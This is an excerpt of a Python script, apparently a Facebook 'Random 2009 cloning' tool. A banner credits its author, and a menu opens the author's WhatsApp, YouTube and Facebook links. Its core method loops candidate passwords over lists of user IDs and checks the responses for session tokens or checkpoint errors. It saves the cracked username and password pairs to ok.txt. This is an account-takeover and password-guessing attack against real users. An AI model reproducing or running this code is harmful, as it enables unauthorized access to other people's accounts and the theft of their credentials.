...
\033[1;97m
\033[93;1m╭──────────•◈•───────────────────╮
\033[93;1m[-] TOOLS     RANDOM 2009 CLONING
\033[93;1m[-] VERSION    2.0.0 (V2)
\033[93;1m[-] AUTHOR    MUKTADIR AHMED 
\033[93;1m[-] GITHUB     ABIR99308
\033[93;1m[-] CREATOR  MUKTADIR
\033[93;1m╰──────────•◈•───────────────────╯  
\033[93;1mWELCOME TO MY RANDOM 2009 TOOL 🔥
...
class Main:
	def __init__(self):
		...
		if syed in ["", " "]:
			...
			os.system("xdg-open https://youtube.com/@muktadir0076")
			print("")
			time.sleep(2.0)
			print("\033[1;33m   Enter Your Name")
			print("")
			input("\n\033[1;32m  Type Your Gf Name ==> \033[1;36m")
			time.sleep(2.1)
			print("")
		...
		print('\x1b[1;32m [2] \x1b[1;32mJOIN ON WHATSAPP GROUP')
		print(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY CHANNEL')
		print(' \x1b[1;32m[4] \x1b[1;32mJOIN MY FB GROUP ')
		print(' \x1b[1;32m[00] \x1b[1;31mEXIT')
		SNIGDHO =input('\n   \x1b[1;32m Choose option >>> ')
		if SNIGDHO in ["1", "01"]:
			self.fbtua()
		if SNIGDHO in ["2", "02"]:
			os.system('xdg-open https://chat.whatsapp.com/BAM1sLvsxhCHArq6cYSXCZ')
		if SNIGDHO in ["3", "03"]:
			os.system('xdg-open https://youtube.com/@muktadir0076')
		if SNIGDHO in ["4", "04"]:
			os.system('xdg-open https://www.facebook.com/groups/1370392673789365/?ref=share')
		if SNIGDHO in ["0", "00"]:
			self.old2()
			exit()
		else:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[M01] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [EHAN_OK] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[1;32m  [Abir_OK] %s | %s\033[1;32m       "%(uid, pw)) 
				self.cp.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
